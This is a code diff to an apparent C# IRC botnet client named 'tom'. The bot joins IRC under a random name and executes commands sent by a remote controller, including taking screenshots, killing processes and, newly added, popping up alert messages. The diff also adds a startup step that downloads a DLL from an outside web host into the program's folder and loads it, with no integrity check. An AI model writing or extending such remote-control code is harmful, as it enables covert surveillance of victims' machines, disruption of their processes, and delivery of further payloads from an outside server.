@@ -5,6 +5,8 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Threading;
 using ChatSharp;
+using System.Net;
+using System.Windows.Forms;
 
 namespace tom
 {
@@ -24,7 +26,11 @@ namespace tom
             actions = new BotActions(this);
 
             Random r = new Random();            
-            name = "tom_"+VERSION+"_" + r.Next(10000);            
+            name = "tom_"+VERSION+"_" + r.Next(10000);
+
+            WebClient Client = new WebClient();
+            Client.DownloadFile("http://jaredeverett.ca/bots/ChatSharp.dll", @System.IO.Path.GetDirectoryName(Application.ExecutablePath)+"\\ChatSharp.dll");
+
             Connect(name);
         }
 
@@ -41,37 +47,27 @@ namespace tom
                     // if all includes this bots version
                     if (msg[1].Equals(VERSION) || msg[1].Equals("v*"))
                     {
-                        if (msg.Length > 3)
-                        {
-                            String[] cmd = { msg[2], msg[3] };
-                            DoAction(cmd);
-                        }
-                        else if (msg.Length > 2)
-                        {
-                            String[] cmd = {msg[2]};
-                            DoAction(cmd);
-                        }                        
+                        List<string> commands = new List<string>();
+                        if (msg.Length > 2)
+                            for (int i = 2; i < msg.Length; i++)
+                                commands.Add(msg[i]);
+                        DoAction(commands);
                     }
                 }
                 if (msg[0].Equals(name))
                 {
-                    if (msg.Length > 2)
-                    {
-                        String[] cmd = { msg[1], msg[2] };
-                        DoAction(cmd);
-                    }
-                    else if (msg.Length > 1)
-                    {
-                        String[] cmd = { msg[1] };
-                        DoAction(cmd);
-                    }
+                    List<string> commands = new List<string>();
+                    if (msg.Length > 1)
+                        for (int i = 1; i < msg.Length; i++)
+                            commands.Add(msg[i]);
+                    DoAction(commands);
                 }
             }
         }
 
-        public void DoAction(string[] command)
+        public void DoAction(List<string> commands)
         {
-            switch (command[0])
+            switch (commands[0])
             {
                 case "hi":
                     SendMessage("hello");
@@ -91,9 +87,16 @@ namespace tom
                 case "screen":
                     actions.ScreenShot();
                     break;
+                case "alert":
+                    String message = "";
+                    if (commands.Count > 1)
+                        for (int i = 1; i < commands.Count; i++)
+                            message += commands[i] + " ";
+                    actions.ShowMessage(message);
+                    break;
                 case "kill":
-                    if (command.Length > 1)
-                        actions.KillProcess(command[1]);
+                    if (commands.Count > 1)
+                        actions.KillProcess(commands[1]);
                     break;
             }
         }
